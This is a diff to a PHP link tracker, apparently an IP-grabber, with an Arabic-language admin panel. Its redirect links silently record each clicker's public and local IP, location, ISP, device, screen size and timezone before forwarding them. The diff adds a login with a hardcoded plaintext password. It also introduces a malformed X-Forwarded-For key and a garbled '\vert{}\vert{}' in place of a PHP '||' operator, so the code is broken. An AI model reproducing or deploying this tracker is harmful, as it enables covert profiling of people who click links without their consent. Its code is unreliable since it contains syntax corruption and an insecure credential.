@@ -3,6 +3,31 @@
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
+// بدء الجلسة لنظام تسجيل الدخول
+session_start();
+
+// بيانات الحساب الخاص بك (يمكنك تغييرها كما ترغب)
+$admin_user = "SCLC";
+$admin_pass = "aziz123";
+
+// معالجة تسجيل الدخول والخروج
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: /");
+    exit();
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['login'])) {
+    if (isset($_POST['username']) && isset($_POST['password'])) {
+        if ($_POST['username'] === $admin_user &&$_POST['password'] === $admin_pass) {$_SESSION['logged_in'] = true;
+            header("Location: /");
+            exit();
+        } else {
+            $login_error = "اسم المستخدم أو كلمة المرور غير صحيحة!";
+        }
+    }
+}
+
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
@@ -34,8 +59,8 @@ try {
 }
 
 function get_real_ip() {
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
+    if (!empty($_SERVER['HTTP_X-FORWARDED-FOR'])) {
+        $ips = explode(',',$_SERVER['HTTP_X-FORWARDED-FOR']);
         return trim($ips[0]);
     }
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
@@ -83,7 +108,7 @@ function get_ip_details($ip) {
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-// 1. معالجة إعادة التوجيه
+// 1. معالجة إعادة التوجيه (مفتوحة للجميع لكي يعمل التتبع)
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
@@ -101,9 +126,7 @@ if (isset($_GET['r'])) {
         try {
             $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
             $logStmt->execute([$code, $public_ip,$local_ip, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
-        } catch (Exception $e) {
-            // الاستمرار في حالة خطأ السجل
-        }
+        } catch (Exception $e) {}
 
         header("Location: " . $target);
         exit();
@@ -112,7 +135,49 @@ if (isset($_GET['r'])) {
     }
 }
 
-// 2. إنشاء رابط جديد
+// إذا لم يكن مسجلاً للدخول، يتم عرض صفحة تسجيل الدخول فقط
+if (!isset($_SESSION['logged_in']) \vert{}\vert{}$_SESSION['logged_in'] !== true):
+?>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - لوحة التحكم</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
+        body { background-color: #0b0f19; color: #f3f4f6; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 15px; }
+        .login-card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 30px; width: 100%; max-width: 400px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+        h2 { color: #38bdf8; font-size: 20px; margin-bottom: 20px; text-align: center; }
+        .form-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 15px; }
+        input { background: #030712; border: 1px solid #374151; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; }
+        input:focus { border-color: #38bdf8; }
+        button { background: #0284c7; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: background 0.2s; font-size: 15px; width: 100%; }
+        button:hover { background: #0369a1; }
+        .error { background: #7f1d1d; color: #fca5a5; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 15px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <h2>🔒 تسجيل الدخول للوحة التحكم</h2>
+        <?php if (isset($login_error)): ?>
+            <div class="error"><?php echo $login_error; ?></div>
+        <?php endif; ?>
+        <form method="POST">
+            <div class="form-group">
+                <input type="text" name="username" placeholder="اسم المستخدم" required>
+                <input type="password" name="password" placeholder="كلمة المرور" required>
+                <button type="submit" name="login">دخول</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
+<?php
+exit();
+endif;
+
+// 2. إنشاء رابط جديد (للمسؤول فقط)
 $generated_link = "";
 $tracking_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
@@ -146,7 +211,7 @@ if (!empty($filter_code)) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello World from azez</title>
+    <title>Hello World from azez - لوحة التحكم</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body { background-color: #0b0f19; color: #f3f4f6; padding: 15px; line-height: 1.5; }
@@ -154,10 +219,12 @@ if (!empty($filter_code)) {
         .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
         .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
         h1 { color: #38bdf8; font-size: 22px; font-weight: 800; }
-        .stats-group { display: flex; gap: 10px; }
+        .stats-group { display: flex; gap: 10px; align-items: center; }
         .stat-box { background: #1f2937; padding: 8px 14px; border-radius: 8px; text-align: center; border: 1px solid #374151; }
         .stat-box span { display: block; font-size: 10px; color: #9ca3af; }
         .stat-box strong { font-size: 16px; color: #38bdf8; }
+        .logout-btn { background: #dc2626; padding: 8px 14px; font-size: 13px; border-radius: 8px; color: #fff; text-decoration: none; font-weight: bold; }
+        .logout-btn:hover { background: #b91c1c; }
         h2 { color: #38bdf8; font-size: 16px; margin-bottom: 12px; font-weight: 700; }
         .form-group { display: flex; flex-direction: column; gap: 10px; }
         @media(min-width: 600px) { .form-group { flex-direction: row; } }
@@ -171,7 +238,7 @@ if (!empty($filter_code)) {
         th { background: #030712; color: #9ca3af; padding: 12px; border-bottom: 1px solid #1f2937; white-space: nowrap; }
         td { padding: 12px; border-bottom: 1px solid #1f2937; color: #e5e7eb; white-space: nowrap; }
         tr:hover { background: rgba(31, 41, 55, 0.4); }
-        .badge { background: #064e3b; color: #34d399; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; border: 1px solid #065f46; }
+        .badge { background: #064e3b; color: #34d399; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; }
         .ip-public { font-family: monospace; color: #38bdf8; font-weight: bold; }
         .ip-local { font-family: monospace; color: #34d399; font-weight: bold; }
         .copy-btn { background: #374151; padding: 6px 10px; font-size: 11px; border-radius: 4px; cursor: pointer; color: #fff; border: none; }
@@ -189,8 +256,6 @@ if (!empty($filter_code)) {
             if (redirectCode && !hasScreen) {
                 const screenRes = screen.width + "x" + screen.height;
                 const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-                // التوجيه السريع مع إرسال الأبعاد والمنطقة الزمنية
                 window.location.href = `/?r=${redirectCode}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
             }
         });
@@ -214,7 +279,7 @@ if (!empty($filter_code)) {
         <div class="card header">
             <div>
                 <h1>Hello World from azez</h1>
-                <p style="color: #9ca3af; font-size: 12px; margin-top: 2px;">لوحة تحكم تتبع الروابط المتقدمة</p>
+                <p style="color: #9ca3af; font-size: 12px; margin-top: 2px;">لوحة تحكم محمية خاصة بالمسؤول</p>
             </div>
             <div class="stats-group">
                 <div class="stat-box">
@@ -225,6 +290,7 @@ if (!empty($filter_code)) {
                     <span>النقرات</span>
                     <strong style="color: #34d399;"><?php echo $total_visits; ?></strong>
                 </div>
+                <a href="/?logout=1" class="logout-btn">خروج 🔓</a>
             </div>
         </div>
 
